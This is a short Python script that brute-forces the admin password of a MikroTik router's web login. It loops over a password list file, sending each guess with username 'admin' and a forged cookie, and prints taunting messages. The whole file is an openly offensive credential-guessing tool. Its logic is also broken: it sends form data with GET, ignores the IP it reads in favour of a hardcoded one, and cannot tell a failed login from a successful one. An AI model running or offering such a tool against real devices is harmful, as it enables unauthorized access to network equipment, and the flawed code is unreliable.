#!/usr/bin/env python
import requests
from bs4 import BeautifulSoup
import re
import time


ip = input()
ip = ('http://' + ip + '/')
BRUT_HEADERS = {"user-agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
                "Cookie" : "username=admin"}

def brut_mikrotik(ip, file_pwd):
    for pwd in open(file_pwd, 'r'):
        brut_session = requests.Session()
        pwd = re.sub("\s*\n*\s*", '', pwd)
        brut_data = {"ip": "192.168.88.1",
                    "name": "admin",
                    "password": pwd
                     }
        brut_response = brut_session.get(url=ip, data=brut_data)
        time.sleep(1)
        try:
            find_error = BeautifulSoup(brut_response.content, 'html.parser')
            brut_convert = find_error.findAll("div", {"id" : "error"})
            print(find_error)
            print(pwd)
            #Authentication failed: invalid username or password.
            if find_error:
                print('bad clown :(')
            else:
                print('very bad clown :)')
        except requests.exceptions.ConnectionError:
            print('error')


brut_mikrotik('http://192.168.88.1/', 'passlist.txt')
